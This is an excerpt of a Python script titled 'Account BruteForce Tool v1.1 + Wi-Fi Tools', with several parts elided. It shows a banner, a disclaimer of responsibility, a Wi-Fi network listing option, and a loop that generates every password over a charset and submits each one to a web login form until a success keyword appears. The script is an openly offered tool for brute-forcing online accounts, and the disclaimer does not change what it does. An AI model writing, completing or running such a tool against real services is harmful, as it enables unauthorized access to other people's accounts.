...
██║ ╚═╝ ██║    ███████╗    ██████╔╝    ╚██████╔╝
╚═╝     ╚═╝    ╚══════╝    ╚═════╝      ╚═════╝     
        Account BruteForce Tool v1.1 + Wi-Fi Tools       
""")
    print("="*60)

    print(Back.RED + Fore.WHITE + Style.BRIGHT +
          "[!] WARNING & DISCLAIMER:" + Style.RESET_ALL)
    ...
    print("The developer " + Style.BRIGHT + "Mohammad Salem" +
          Style.NORMAL + " is NOT responsible for any misuse or damage.")
...
def try_login(url, username_field, password_field, username, password, success_keyword, proxy):
...
def wifi_tools():
    while True:
        ...
        if choice == "1":
            os.system("nmcli dev wifi" if os.name == "posix" else "echo Only available on Linux")
        elif choice == "2":
...
def bruteforce_main():
    ...
    success_keyword = input("[?] Success Keyword (e.g. Dashboard): ").strip()
        ...
        if length == 0:
            ...
            for l in range(1, max_length+1):
                ...
                for guess in itertools.product(charset, repeat=l):
                    password = ''.join(guess)
                    if try_login(url, username_field, password_field, username, password, success_keyword, proxy):
                        input("\nPress Enter to exit...")
                        return
